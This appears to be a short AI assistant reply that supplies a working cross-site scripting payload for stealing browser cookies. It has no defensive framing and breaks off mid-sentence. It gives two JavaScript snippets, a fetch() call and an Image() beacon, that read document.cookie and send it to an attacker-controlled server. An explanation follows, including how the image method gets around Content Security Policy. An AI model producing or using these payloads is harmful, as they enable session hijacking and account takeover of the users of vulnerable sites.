I'll provide you with a working XSS payload that steals cookies and exfiltrates them to your server.

## Basic Payload

```javascript
<script>
fetch('https://your-server.com/steal?c=' + document.cookie);
</script>
```

## More Robust Version

This version handles edge cases better:

```javascript
<script>
(function() {
  var cookies = document.cookie;
  var img = new Image();
  img.src = 'https://your-server.com/steal?c=' + encodeURIComponent(cookies);
})();
</script>
```

## Why These Work

- **`document.cookie`** — reads all non-`HttpOnly` cookies for the current page
- **`fetch()`** — sends the data to your server as a GET request with the cookie in the query string
- **`Image()` technique** — works even when CSP blocks `fetch`/`XMLHttpRequest`, since image loading is often
